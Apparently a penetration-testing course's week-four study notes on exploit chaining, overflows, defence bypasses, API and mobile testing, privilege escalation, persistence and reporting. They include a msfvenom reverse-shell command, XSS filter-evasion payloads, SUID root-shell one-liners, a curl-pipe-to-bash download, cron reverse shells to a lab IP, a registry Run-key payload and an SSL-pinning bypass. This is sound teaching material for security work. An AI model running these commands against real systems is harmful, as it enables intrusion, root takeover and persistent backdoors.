# 📖 Week 4 — Theoretical Knowledge Notes

---

## 1. Advanced Exploitation Techniques

### 1.1 Exploit Chaining

Exploit chaining combines multiple vulnerabilities into a single attack sequence to achieve higher-impact outcomes. Individual flaws that appear low severity become critical when chained together.

**Chain Example — CSRF + SQL Injection → Admin Access:**
```
Stage 1: Identify CSRF vulnerability on admin action endpoint
         ↓
Stage 2: Craft malicious page that forces admin to submit forged request
         ↓
Stage 3: Forged request triggers SQL injection in admin-only parameter
         ↓
Stage 4: Extract admin credentials from database
         ↓
Stage 5: Login as admin → full application compromise
```

**EternalBlue (CVE-2017-0144) — Multi-Stage Attack Pattern:**
EternalBlue exploits a buffer overflow in Windows SMBv1. The attack chain:
1. Send malformed SMBv1 packets to port 445
2. Trigger buffer overflow in `srv.sys` kernel driver
3. Execute shellcode in kernel context (SYSTEM privileges)
4. Deploy DoublePulsar backdoor for persistent access
5. Load secondary payload (e.g., WannaCry ransomware or Meterpreter)

**Key lesson:** EternalBlue succeeded because it chained a memory corruption bug with kernel-level execution — no user interaction required, spreading laterally across networks automatically.

---

### 1.2 Custom Exploit Development

**Heap Overflow Concepts:**
A heap overflow occurs when data written to a heap buffer exceeds its allocated size, corrupting adjacent heap metadata or objects.

```
[ Heap Chunk A — 64 bytes ][ Heap Metadata ][ Heap Chunk B ]
         ↑
    overflow here → overwrites metadata → control heap manager
```

**Heap Spray Technique (Browser Exploits):**
Allocates large amounts of controlled data in the heap to increase the probability that a jump lands in attacker-controlled memory.

```python
# Conceptual heap spray (educational)
nop_sled = b"\x90" * 1000          # NOP sled
shellcode = b"\xcc" * 100           # breakpoint placeholder
chunk = nop_sled + shellcode
heap_spray = chunk * 10000          # spray heap with controlled data
```

**Modifying Exploit-DB PoCs for Buffer Overflows:**

Key steps when customising a buffer overflow PoC:
1. Identify the vulnerable binary version on target
2. Recalculate EIP/RIP offset using `msf-pattern_create` and `msf-pattern_offset`
3. Find new bad characters for the target environment
4. Locate a new JMP ESP address for the target binary
5. Generate fresh shellcode with msfvenom

```bash
# Recalculate offset
msf-pattern_create -l 500
msf-pattern_offset -q 41386241      # value found in EIP after crash

# Find JMP ESP in binary
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -b "\x00" -f python
```

---

### 1.3 Bypassing Defenses

**ASLR (Address Space Layout Randomisation):**
Randomises memory addresses each run. Bypasses include:
- **Info leak:** Find a vulnerability that reveals a memory address → calculate base
- **Brute force:** Only effective on 32-bit (limited entropy)
- **ROP (Return-Oriented Programming):** Use existing code gadgets — no new code injected

**DEP/NX (Data Execution Prevention):**
Marks stack/heap as non-executable. Bypassed by:
- **ROP chains:** Chain existing executable code gadgets to perform arbitrary operations
- **ret2libc:** Return to existing library functions (e.g., `system("/bin/sh")`)

**WAF Bypass — Polymorphic Payloads:**
```python
# Same XSS payload, different forms — evades signature matching
payloads = [
    "<script>alert(1)</script>",                    # basic — blocked
    "<ScRiPt>alert(1)</ScRiPt>",                    # case variation
    "<script>alert`1`</script>",                    # template literal
    "<img src=x onerror=alert(1)>",                 # event handler
    "javascript:alert(1)",                          # URI scheme
    "<svg/onload=alert(1)>",                        # SVG
]
```

---

## 2. API Security Testing

### 2.1 OWASP API Security Top 10 (2023)

| Rank | Vulnerability | Description | Example |
|------|--------------|-------------|---------|
| A01 | Broken Object Level Authorization (BOLA) | Access other users' objects by changing ID | `/api/users/123` → change to `/api/users/124` |
| A02 | Broken Authentication | Weak tokens, no expiry | JWT with `alg:none` |
| A03 | Broken Object Property Level Auth | Access/modify hidden fields | PATCH request adds `"role":"admin"` |
| A04 | Unrestricted Resource Consumption | No rate limiting | 10,000 API calls per second |
| A05 | Broken Function Level Authorization | Access admin functions as user | `DELETE /api/admin/users/1` |
| A06 | Unrestricted Access to Sensitive Business Flows | Abuse legitimate flows | Buy unlimited stock via race condition |
| A07 | SSRF | Server makes requests to internal resources | `?url=http://169.254.169.254/metadata` |
| A08 | Security Misconfiguration | Debug mode, verbose errors | Stack traces in API responses |
| A09 | Improper Inventory Management | Undocumented/old API versions | `/api/v1/` still active after `/api/v3/` released |
| A10 | Unsafe Consumption of APIs | Trusting third-party API data | Injecting via third-party webhook |

---

### 2.2 API Testing Techniques

**Burp Suite — API Endpoint Enumeration:**
```
1. Proxy → Intercept all traffic while using the application
2. Target → Site Map → right-click → Spider this host
3. Look for /api/, /v1/, /graphql, /rest/ endpoints
4. Send interesting requests to Repeater for manipulation
```

**BOLA Testing:**
```bash
# Login as user A, get their ID
GET /api/users/101/profile
Authorization: Bearer TOKEN_USER_A

# Try accessing user B's data with user A's token
GET /api/users/102/profile
Authorization: Bearer TOKEN_USER_A
# If response returns user B data → BOLA confirmed
```

**GraphQL Injection:**
```graphql
# Introspection query — enumerate all types and fields
{ __schema { types { name fields { name } } } }

# Injection attempt
{ user(id: "1 OR 1=1") { username email password } }

# Batch query abuse
[{"query":"{ user(id:1) { password } }"},
 {"query":"{ user(id:2) { password } }"}]
```

**Rate Limit Bypass:**
```bash
# Add headers to confuse rate limiting
X-Forwarded-For: 1.2.3.4        # rotate IPs
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12

# Or use Burp Intruder with IP rotation
```

**Postman Fuzzing:**
```json
// Create collection → Add request
// Use variables for fuzzing
GET {{base_url}}/api/users/{{user_id}}

// In Tests tab — check for sensitive data exposure
pm.test("No sensitive data", function() {
    pm.expect(pm.response.text()).to.not.include("password");
});
```

---

## 3. Privilege Escalation and Persistence

### 3.1 Linux Privilege Escalation

**SUID Binaries:**
SUID (Set User ID) binaries run with the file owner's privileges regardless of who executes them. If a SUID binary is owned by root and exploitable → instant root access.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common exploitable SUID binaries (GTFOBins)
# nmap (older versions)
nmap --interactive
nmap> !sh      # drops to root shell

# find
find . -exec /bin/sh -p \; -quit

# vim
vim -c ':!/bin/sh'

# python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Kernel Exploits:**
```bash
# Check kernel version
uname -a

# Search for exploits
searchsploit linux kernel 2.6.24    # Metasploitable2 kernel
```

**LinPEAS — Automated Enumeration:**
```bash
# Download LinPEAS on Kali
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Transfer to target
# On Kali
python3 -m http.server 8080

# On target
curl http://192.168.56.101:8080/linpeas.sh | bash

# Or download then run
wget http://192.168.56.101:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

### 3.2 Persistence Mechanisms

**Linux — Cron Job Persistence:**
```bash
# Add reverse shell to crontab — runs every minute
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/4444 0>&1'") | crontab -

# Verify cron entry
crontab -l

# System-wide cron (requires root)
echo "* * * * * root bash -i >& /dev/tcp/192.168.56.101/4444 0>&1" >> /etc/crontab
```

**Windows — Registry Persistence:**
```cmd
# Add payload to run on startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\Public\payload.exe" /f
```

**PowerShell — WMI Persistence:**
```powershell
# Create WMI event subscription for persistence
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemCheck"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
```

---

## 4. Network Protocol Attacks

### 4.1 SMB Relay Attack

An SMB relay attack intercepts NTLM authentication attempts and relays them to another target to gain unauthorised access — without ever cracking the password.

**Attack Flow:**
```
Victim → [tries to authenticate to attacker] → Responder captures NTLM hash
Responder → relays hash to real target → authenticates as victim
Attacker → gains access to target with victim's privileges
```

**Requirements:**
- SMB signing disabled on target (common on workstations)
- Attacker must be on same network segment
- LLMNR/NBT-NS must be enabled on victim (usually default)

---

### 4.2 Man-in-the-Middle (MitM)

**ARP Spoofing:**
ARP has no authentication — attacker sends fake ARP replies associating their MAC with the gateway IP, intercepting all traffic.

```
Normal:  Victim → Gateway → Internet
MitM:    Victim → Attacker → Gateway → Internet
                    ↑ intercepts all traffic here
```

**DNS Poisoning:**
Attacker responds to DNS queries with malicious IP addresses before legitimate DNS server responds.

**SSL Stripping:**
Downgrades HTTPS connections to HTTP by intercepting the initial HTTP request before HTTPS redirect, making traffic readable.

---

## 5. Mobile Application Penetration Testing

### 5.1 OWASP Mobile Top 10

| Rank | Vulnerability | Description |
|------|--------------|-------------|
| M1 | Improper Platform Usage | Misuse of platform features (e.g., Touch ID bypass) |
| M2 | Insecure Data Storage | Sensitive data in SQLite, SharedPreferences, logs |
| M3 | Insecure Communication | No TLS, certificate pinning bypass |
| M4 | Insecure Authentication | Weak PINs, biometric bypass |
| M5 | Insufficient Cryptography | Weak algorithms (MD5, DES), hardcoded keys |
| M6 | Insecure Authorization | IDOR in mobile API calls |
| M7 | Client Code Quality | Buffer overflows, format strings in native code |
| M8 | Code Tampering | Patching APKs, method hooking |
| M9 | Reverse Engineering | Decompiling APKs, extracting secrets |
| M10 | Extraneous Functionality | Hidden backdoors, debug features in production |

---

### 5.2 Static Analysis with MobSF

```bash
# Install MobSF via Docker
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# Access UI
# Open browser → http://localhost:8000
# Upload APK → automated analysis runs

# Key findings to look for:
# - Hardcoded API keys/passwords
# - Insecure storage (external storage, world-readable files)
# - Exported components (Activities, Services, Receivers)
# - Weak cryptography usage
# - Cleartext traffic allowed
```

---

### 5.3 Dynamic Analysis with Frida

```bash
# Install Frida
pip3 install frida-tools --break-system-packages

# List running apps on connected Android device
frida-ps -U

# Hook SSL pinning bypass
frida -U -l ssl_bypass.js -f com.target.app

# Common bypass script
# ssl_bypass.js:
Java.perform(function() {
    var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    TrustManager.checkClientTrusted.implementation = function() { return; };
    TrustManager.checkServerTrusted.implementation = function() { return; };
});
```

---

## 6. Comprehensive Reporting and Remediation

### 6.1 CVSS vs DREAD Scoring

**CVSS v4.0** — Industry standard, objective:

| Metric | Options |
|--------|---------|
| Attack Vector | Network / Adjacent / Local / Physical |
| Attack Complexity | Low / High |
| Privileges Required | None / Low / High |
| User Interaction | None / Passive / Active |
| Impact (C/I/A) | None / Low / High |

**DREAD** — Older Microsoft model, more subjective (1-10 each):

| Letter | Meaning | Question |
|--------|---------|---------|
| D | Damage | How bad is the damage if exploited? |
| R | Reproducibility | How easy to reproduce? |
| E | Exploitability | How easy to exploit? |
| A | Affected Users | How many users affected? |
| D | Discoverability | How easy to discover? |

**Total DREAD = Average of all five scores**

---

### 6.2 Attack Timeline Narrative

Professional reports include an attack timeline showing the sequence of events:

```
09:00 — Reconnaissance: Nmap scan identified open ports
09:30 — Vulnerability scan: OpenVAS identified vsftpd 2.3.4 backdoor
10:00 — Exploitation: Metasploit module exploited vsftpd — root shell obtained
10:15 — Post-exploitation: /etc/shadow downloaded, NTLM hashes dumped
10:30 — Persistence: Cron job installed for persistent access
10:45 — Evidence collection: All artifacts hashed and documented
11:00 — Reporting: Findings compiled into PTES report
```

---

### 6.3 Zero-Trust Architecture Recommendations

| Principle | Implementation |
|-----------|---------------|
| Verify explicitly | MFA on all access, continuous authentication |
| Least privilege | Role-based access, just-in-time privilege |
| Assume breach | Segment networks, monitor all traffic |
| Encrypt everything | TLS 1.3 in transit, AES-256 at rest |
| Log everything | SIEM integration, centralised logging |

---

